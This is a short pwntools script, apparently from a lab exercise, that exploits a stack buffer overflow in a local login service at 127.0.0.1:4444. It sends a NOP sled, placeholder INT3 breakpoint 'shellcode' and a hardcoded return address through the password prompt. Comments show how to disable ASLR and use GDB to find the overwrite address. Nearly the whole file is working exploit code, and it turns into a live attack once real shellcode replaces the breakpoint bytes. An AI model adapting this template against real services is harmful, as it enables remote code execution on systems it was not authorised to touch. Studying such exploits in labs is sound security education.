from pwn import *

# Prerequisite -  Disable ASLR
"""
sudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space' # Enable
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space' # Disable
ulimit -c unlimited    
"""

# Set up the context for the exploit
context.update(arch='i386', os='linux')
r = remote('127.0.0.1', 4444)

r.recvuntil(b"Username: ")
r.sendline(b"bob")

r.recvuntil(b"Password: ")

offset = 76

shellcode = b"\xcc" * 10                        # SIGTRAP INT 3 (breakpoint)
nop_sled = b"\x90" * (offset - len(shellcode))  # NOP = No Operation
pre_eip = nop_sled + shellcode                  

ret_add = p32(0xffffc6f0)       # GDB: 0xffffc790     Non-GDB: 0xffffc810
payload = pre_eip + ret_add     # [NOP SLED][SHELLCODE][ADDRESS] 

r.send(payload)
r.close()

"""
(gdb) break handle_client
(gdb) run
...
(gdb) ni
(gdb) disas handle_client
(gdb) break *<address after read>
(gdb) continue
(gdb) x/300xb $esp
(gdb) x/16xb $esp+250
(gdb) x/10i $esp+250
"""